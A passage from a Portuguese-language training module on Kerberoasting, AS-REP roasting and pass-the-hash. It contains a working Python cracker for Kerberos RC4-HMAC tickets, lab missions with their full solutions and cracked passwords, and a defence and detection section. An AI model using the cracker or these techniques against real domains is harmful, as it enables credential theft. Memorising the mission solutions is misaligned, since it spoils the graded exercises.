+      "note": "ZGVjb3k6IHRoaXMgaXMgdGhlIGNsZWFydGV4dCBwYXNzd29yZCwgbm90IGEgaGFzaDsgcGFzcy10aGUtaGFzaCBpcyBwcmVjaXNlbHkgdGhlIHRyaWNrIG9mIG5vdCBuZWVkaW5nIGl0" }
+  ]
+}
+EOF
+
+echo "Artefatos prontos em $ROOT"; ls -1 "$ROOT"
+```
+
+Agora o cracker. Ele implementa `MD4` (que o `hashlib` moderno não traz mais), RC4, HMAC-MD5 e a decifragem RC4-HMAC do Kerberos (RFC 4757). **Salve este conteúdo como `roast.py` dentro de `/tmp/ad-attacks`:**
+
+```python
+import sys, struct, hmac, hashlib
+
+def md4(msg):
+    def F(x, y, z): return (x & y) | (~x & z)
+    def G(x, y, z): return (x & y) | (x & z) | (y & z)
+    def H(x, y, z): return x ^ y ^ z
+    def lr(x, s):
+        x &= 0xFFFFFFFF
+        return ((x << s) | (x >> (32 - s))) & 0xFFFFFFFF
+    msg = bytearray(msg)
+    ln = (8 * len(msg)) & 0xFFFFFFFFFFFFFFFF
+    msg.append(0x80)
+    while len(msg) % 64 != 56:
+        msg.append(0)
+    msg += struct.pack("<Q", ln)
+    a0, b0, c0, d0 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
+    for off in range(0, len(msg), 64):
+        X = struct.unpack("<16I", msg[off:off + 64])
+        a, b, c, d = a0, b0, c0, d0
+        for k, s in [(0,3),(1,7),(2,11),(3,19),(4,3),(5,7),(6,11),(7,19),
+                     (8,3),(9,7),(10,11),(11,19),(12,3),(13,7),(14,11),(15,19)]:
+            a, b, c, d = d, lr((a + F(b, c, d) + X[k]) & 0xFFFFFFFF, s), b, c
+        for k, s in [(0,3),(4,5),(8,9),(12,13),(1,3),(5,5),(9,9),(13,13),
+                     (2,3),(6,5),(10,9),(14,13),(3,3),(7,5),(11,9),(15,13)]:
+            a, b, c, d = d, lr((a + G(b, c, d) + X[k] + 0x5A827999) & 0xFFFFFFFF, s), b, c
+        for k, s in [(0,3),(8,9),(4,11),(12,15),(2,3),(10,9),(6,11),(14,15),
+                     (1,3),(9,9),(5,11),(13,15),(3,3),(11,9),(7,11),(15,15)]:
+            a, b, c, d = d, lr((a + H(b, c, d) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s), b, c
+        a0 = (a0 + a) & 0xFFFFFFFF
+        b0 = (b0 + b) & 0xFFFFFFFF
+        c0 = (c0 + c) & 0xFFFFFFFF
+        d0 = (d0 + d) & 0xFFFFFFFF
+    return struct.pack("<4I", a0, b0, c0, d0)
+
+def nt(password):
+    # NT hash = MD4 da senha em UTF-16LE. No etype 23, essa e a chave.
+    return md4(password.encode("utf-16-le"))
+
+def rc4(key, data):
+    S = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) & 0xFF
+        S[i], S[j] = S[j], S[i]
+    out = bytearray()
+    i = j = 0
+    for ch in data:
+        i = (i + 1) & 0xFF
+        j = (j + S[i]) & 0xFF
+        S[i], S[j] = S[j], S[i]
+        out.append(ch ^ S[(S[i] + S[j]) & 0xFF])
+    return bytes(out)
+
+def hm(key, data):
+    return hmac.new(key, data, hashlib.md5).digest()
+
+def decrypt(key, usage, cipher):
+    # RC4-HMAC (etype 23), RFC 4757: checksum (16 bytes) + RC4(confounder|dados)
+    k1 = hm(key, struct.pack("<I", usage))
+    checksum, edata = cipher[:16], cipher[16:]
+    blob = rc4(hm(k1, checksum), edata)
+    return blob[8:], hm(k1, blob) == checksum
+
+def parse(h):
+    if h.startswith("$krb5tgs$"):
+        checksum, edata = h.rsplit("*", 1)[1].strip("$").split("$")
+    elif h.startswith("$krb5asrep$"):
+        checksum, edata = h.split(":", 1)[1].split("$")
+    else:
+        sys.exit("formato de hash desconhecido")
+    return bytes.fromhex(checksum) + bytes.fromhex(edata)
+
+def main():
+    cipher = parse(open(sys.argv[1]).read().strip())
+    usage = int(sys.argv[2])
+    for pw in open("wordlist.txt").read().split():
+        plaintext, ok = decrypt(nt(pw), usage, cipher)
+        if ok:
+            print("[+] senha quebrada:", pw)
+            print("[+] conteudo cifrado:", plaintext.decode(errors="replace"))
+            return
+    print("[-] nenhuma senha da wordlist serviu")
+
+if __name__ == "__main__":
+    main()
+```
+
+### 5.2 Missão 1 — quebrar o ticket Kerberoastável (guiada)
+
+Você tem o hash `$krb5tgs$23$` de `svc_mssql` em `m1-kerberoast.txt`. O cracker precisa de dois argumentos: o arquivo do hash e a **key usage** — um número que o Kerberos usa para derivar a chave de cada tipo de mensagem. Para o TGS-REP, esse número é **2**:
+
+```console
+$ cd /tmp/ad-attacks
+$ python3 roast.py m1-kerberoast.txt 2
+[+] senha quebrada: Summer2024!
+[+] conteudo cifrado: FLAG{...}
+```
+
+O cracker testou cada senha da wordlist: para cada uma, calculou `nt(senha) = MD4(senha em UTF-16LE)`, usou isso como chave para decifrar e conferiu o checksum. `Summer2024!` bateu — e o conteúdo que estava cifrado no ticket é a sua flag. Esse é o Kerberoasting inteiro, em miniatura: a senha da conta de serviço **é** a chave do ticket.
+
+<FlagInput task="missao-1-kerberoast" />
+
+### 5.3 Missão 2 — quebrar o AS-REP sem senha (desafio)
+
+Agora o `m2-asrep.txt`, um `$krb5asrep$23$` da conta `svc_legacy` (a conta sem pré-autenticação que você achou no 7.2). A matemática é a mesma — o cracker já sabe ler o formato `$krb5asrep$`. O que muda é a **key usage**: o AS-REP não usa o mesmo número do TGS-REP. Seu objetivo: descobrir a key usage certa, rodar o cracker e ler a flag.
+
+<Hint title="Dica 1">
+Cada tipo de mensagem Kerberos tem uma key usage própria. A do TGS-REP (Missão 1) era 2. A da parte cifrada do AS-REP é um número pequeno e diferente. Se errar a usage, o checksum nunca bate e o cracker diz "nenhuma senha serviu" — mesmo com a senha certa na wordlist.
+</Hint>
+
+<Hint title="Dica 2">
+É a key usage **8**. Ela corresponde ao que o hashcat usa no modo 18200 (AS-REP). Rode: `python3 roast.py m2-asrep.txt 8`.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ python3 roast.py m2-asrep.txt 8
+[+] senha quebrada: Winter2023
+[+] conteudo cifrado: FLAG{...}
+```
+
+A conta `svc_legacy` tinha a pré-autenticação desligada, então esse material veio do KDC **sem que ninguém provasse conhecer a senha**. Bastou pedir e quebrar offline. O conteúdo cifrado é a flag. **Lição:** AS-REP roasting e Kerberoasting são o mesmo truque criptográfico em trocas diferentes do Kerberos — muda a key usage e de onde o material vem, não a quebra.
+</Solution>
+
+<FlagInput task="missao-2-asrep" />
+
+### 5.4 Missão 3 — o artefato que vira pass-the-hash (desafio)
+
+Você dumpou quatro artefatos de credencial da conta `svc_mssql` (arquivo `m3-credentials.json`): um NT hash cru, uma resposta NTLMv2, um TGT Kerberos e a senha em claro. Só **um** deles, sozinho, já autentica por pass-the-hash. Seu objetivo: identificar qual e decodificar a nota (base64) dele — essa nota é a flag. As notas erradas começam com `decoy:` e explicam por que não servem.
+
+<Hint title="Dica 1">
+Pass-the-hash autentica com o **NT hash cru**, do jeito que ele está, sem a senha e sem desafio nenhum. Pergunte de cada artefato: "isto é reutilizável como está?". A resposta NTLMv2 carrega um desafio aleatório do servidor (só serve para quebra offline); o TGT é replayado por *pass-the-ticket* (assunto do 7.4); a senha em claro não é um hash.
+</Hint>
+
+<Hint title="Dica 2">
+Liste as notas decodificadas e veja qual **não** começa com `decoy:`:
+
+```console
+$ python3 -c "
+import json, base64
+for a in json.load(open('m3-credentials.json'))['artifacts']:
+    print(a['kind'], '->', base64.b64decode(a['note']).decode())
+"
+```
+</Hint>
+
+<Solution title="Solução">
+O artefato reutilizável é o `nt_hash`. As outras três notas decodificam para avisos `decoy:` (a resposta NTLMv2 é salgada com o desafio do servidor; o TGT é pass-the-ticket; o valor em claro é a senha, não um hash). A nota do `nt_hash` é a flag:
+
+```console
+$ python3 -c "
+import json, base64
+a = [x for x in json.load(open('m3-credentials.json'))['artifacts'] if x['kind']=='nt_hash'][0]
+print(base64.b64decode(a['note']).decode())
+"
+FLAG{...}
+```
+
+E, para fechar o encadeamento, confirme que esse NT hash é exatamente o `MD4` da senha que você quebrou na Missão 1 — ou seja, você **nem precisava ter quebrado**: o hash já bastava.
+
+```console
+$ python3 -c "from roast import nt; print(nt('Summer2024!').hex())"
+72f0eefcc213ea8f350773b831cf2c9c
+```
+
+O valor bate com o `nt_hash` do arquivo. **Lição:** quando você já tem o hash, pass-the-hash é o caminho mais curto — quebrar a senha seria trabalho a mais e, com uma senha forte, impossível. O hash **é** a credencial.
+</Solution>
+
+<FlagInput task="missao-3-pth" />
+
+Quando terminar, as três flags entram nos cartões acima e o quiz da seção 9 fecha o módulo. Nenhum lab para desligar — você só gerou arquivos no `/tmp`.
+
+## 6. Variações e aprofundamento
+
+**Forçar o RC4 (downgrade).** Em domínios modernos, muitas contas já usam AES (etypes 17/18), muito mais caro de quebrar. O atacante contorna pedindo o ticket e anunciando que só suporta o etype 23: o KDC, por compatibilidade, costuma emitir em RC4. Monitorar pedidos de ticket com etype RC4 para contas que normalmente usam AES é, por isso, um sinal forte de ataque.
+
+**Targeted Kerberoasting.** E se a conta-alvo não tiver SPN? Se você tem permissão de escrita sobre ela (uma ACL `GenericAll`/`GenericWrite`, como as arestas do grafo do 7.2), você **escreve** um SPN nela, faz o Kerberoasting e depois apaga o SPN. A enumeração do módulo anterior e o ataque deste se encontram aqui.
+
+**AS-REP roasting sem credencial.** Como visto, com só uma lista de nomes (vinda de OSINT da Trilha 2, ou de uma enumeração anônima) dá para pedir o AS-REP de cada um e descobrir quais contas têm a pré-auth desligada — ataque e enumeração no mesmo passo, sem nenhuma senha.
+
+**Overpass-the-hash (pass-the-key).** É a ponte entre os dois mundos: em vez de usar o NT hash no NTLM, você o usa para pedir um **TGT** Kerberos legítimo e daí em diante age como um usuário normal do Kerberos — bem mais discreto que o NTLM puro. É a porta de entrada para o pass-the-ticket e os ataques de ticket (golden/silver ticket) que você verá no 7.4.
+
+**LM × NT hash.** Hashes bem antigos (`LM`) são fraquíssimos; os atuais são `NT`. No pass-the-hash com `impacket`, o formato `-hashes LM:NT` reflete isso — por isso você vê `:NTHASH` com a parte LM vazia.
+
+## 7. Erros comuns
+
+- **"nenhuma senha da wordlist serviu" mesmo com a senha certa na lista:** key usage errada. O checksum RC4-HMAC só fecha com a usage correta (2 para TGS-REP, 8 para AS-REP). É o erro central da Missão 2.
+- **`KRB_AP_ERR_SKEW` / "clock skew too great":** o Kerberos recusa se o relógio da sua máquina diverge do controlador em mais de ~5 minutos. Sincronize a hora antes de qualquer coisa que use ticket.
+- **Pedir o ticket e vir AES (não quebra no 13100):** se o hash começa com `$krb5tgs$18$` (e não `$23$`), é AES — o modo do hashcat é outro (19600/19700) e a quebra é muito mais lenta. Tente forçar o RC4 na coleta.
+- **Confundir resposta NTLMv2 com NT hash:** a resposta capturada da rede (formato `usuario::dominio:desafio:...`) **não** serve para pass-the-hash — só para quebra offline. Pass-the-hash quer o NT hash cru (32 hex). É o ponto da Missão 3.
+- **Pass-the-hash falhando com erro de acesso:** o NT hash autentica, mas a conta pode não ter direito administrativo naquela máquina. O `(Pwn3d!)` do `nxc` indica onde ela é admin local; sem isso, você autentica mas não executa.
+- **FQDN × IP no Kerberos:** ferramentas Kerberos (ao contrário do NTLM) exigem o nome (FQDN) do alvo e DNS resolvendo para o KDC; usar só o IP costuma falhar na troca de tickets.
+
+## 8. Defesa e mitigação
+
+Os três ataques partem da mesma causa — a senha vira chave — então a defesa ataca a senha, o protocolo fraco e a reutilização, e detecta o pedido suspeito.
+
+**Matar o Kerberoasting:**
+
+- **Troque contas de serviço por <GlossaryTerm term="gMSA">gMSA</GlossaryTerm>** (group Managed Service Accounts). O AD gera e **rotaciona** sozinho uma senha de 120+ caracteres aleatórios: o ticket continua sendo emitido, mas não há wordlist nem GPU que quebre a chave em tempo útil. Onde o gMSA não cabe, imponha senha longa (25+ caracteres) na conta de serviço.
+- **Reduza SPNs em contas de usuário.** Cada conta de usuário com SPN é um alvo. Audite-as periodicamente e remova as desnecessárias.
+
+**Matar o AS-REP roasting:**
+
+- **Exija pré-autenticação em todas as contas.** O `DONT_REQ_PREAUTH` quase nunca tem motivo legítimo hoje. Audite com PowerShell:
+
+```console
+PS> Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol |
+      Select-Object SamAccountName
+```
+
+**Tirar o atalho criptográfico (vale para os dois):**
+
+- **Desabilite o RC4 e force AES (etypes 17/18)** nos tickets, via GPO (`Network security: Configure encryption types allowed for Kerberos`). Sem o etype 23, a quebra offline fica ordens de magnitude mais cara. Faça isso com cuidado e inventário: sistemas legados podem depender de RC4.
+
+**Matar o pass-the-hash:**
+
+- **Credential Guard** isola os segredos do LSASS num ambiente protegido por virtualização, de onde o Mimikatz não os lê. Combine com **LSA protection**.
+- **LAPS** (Local Administrator Password Solution) dá a cada máquina uma senha de administrador local **única e rotacionada** — assim um hash roubado de uma estação não abre as outras (foi a reutilização da senha de admin local que fez o NotPetya voar pela rede).
+- **Grupo Protected Users** e restrição de NTLM reduzem o uso do hash reutilizável; **segmentação** e o princípio de administração em camadas (*tiering*) limitam até onde uma conta comprometida chega.
+
+**Detectar quem ataca:**
+
+- Audite **pedidos de ticket Kerberos**: o evento `4769` (TGS-REQ) com etype `0x17` (RC4) para muitos SPNs diferentes, vindo de uma só conta, é a assinatura clássica do Kerberoasting; o `4768` (AS-REQ) sem pré-autenticação aponta AS-REP roasting.
+- Monitore **logons NTLM anômalos** (LogonType 3) sem o logon de domínio correspondente — a pegada do pass-the-hash, como a própria MITRE sugere na detecção da T1550.002.
+- Plante **honey accounts**: uma conta de serviço com SPN atraente e **sem uso legítimo nenhum**. Qualquer pedido de ticket para ela é, por definição, malicioso — alarme de altíssima confiança.
+
+A ideia que fecha a visão completa: como a senha-virando-chave é o mecanismo, a defesa madura torna a chave inquebrável (gMSA, AES), impede a reutilização do hash (LAPS, Credential Guard, Protected Users) e **escuta** o atacante no exato momento em que ele pede o ticket.
+
+## 9. Exercícios
+
+Responda ao quiz abaixo (ele conta para concluir o módulo) e complete as três missões da seção 5 — cada uma entrega uma flag.
+
+<Quiz task="quiz-final" />
+
+**Desafios extras (sem flag, para fixar):**
+
+- No cracker, por que trocar a key usage de 2 para 8 faz o checksum parar de fechar, mesmo com a senha certa? (Dica: a key usage entra no cálculo de `k1 = HMAC(NT hash, usage)`.)
+- Explique, em duas frases, por que uma `gMSA` com SPN aparece na enumeração como alvo de Kerberoasting mas, na prática, não é quebrável.
+- Você capturou, com responder, uma **resposta NTLMv2** de um usuário. Liste duas coisas que você pode fazer com ela — e por que pass-the-hash **não** é uma delas.
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Os três ataques exploram a senha virando chave: o Kerberoasting e o AS-REP roasting pedem ao Kerberos material cifrado com a chave da senha e o quebram **offline**; o pass-the-hash usa o hash **no lugar** da senha.
+- O vilão criptográfico é o **RC4-HMAC (etype 23)**: a chave do ticket é o NT hash. Forçar AES tira esse atalho.
+- **Kerberoasting** (T1558.003): service ticket de uma conta de usuário com SPN. **AS-REP roasting** (T1558.004): AS-REP de uma conta sem pré-auth, sem nem precisar de credencial. **Pass-the-hash** (T1550.002): autenticar no NTLM com o NT hash cru.
+- O erro clássico: **NT hash** (fixo, reutilizável → pass-the-hash) não é **resposta NTLMv2** (com desafio → só quebra offline).
+- Defesa: gMSA e senhas longas (Kerberoasting), pré-autenticação (AS-REP), AES em vez de RC4, Credential Guard/LAPS/Protected Users (pass-the-hash), e detecção pelos eventos 4768/4769 e logons NTLM anômalos.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [MITRE ATT&CK — T1558.003 Kerberoasting](https://attack.mitre.org/techniques/T1558/003/), [T1558.004 AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) e [T1550.002 Pass the Hash](https://attack.mitre.org/techniques/T1550/002/) — as três técnicas no catálogo, com detecção e grupos que as usam.
+- [Sean Metcalf — Cracking Kerberos TGS Tickets Using Kerberoast (adsecurity.org)](https://adsecurity.org/?p=2293) — a referência que documenta o Kerberoasting desde a origem (Tim Medin, DerbyCon 2014).
+- [Microsoft — New ransomware, old techniques: Petya adds worm capabilities](https://www.microsoft.com/en-us/security/blog/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/) — pass-the-hash e roubo de credenciais no NotPetya.
+- [Microsoft Learn — How to configure Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) — a defesa contra o roubo de hashes do LSASS.
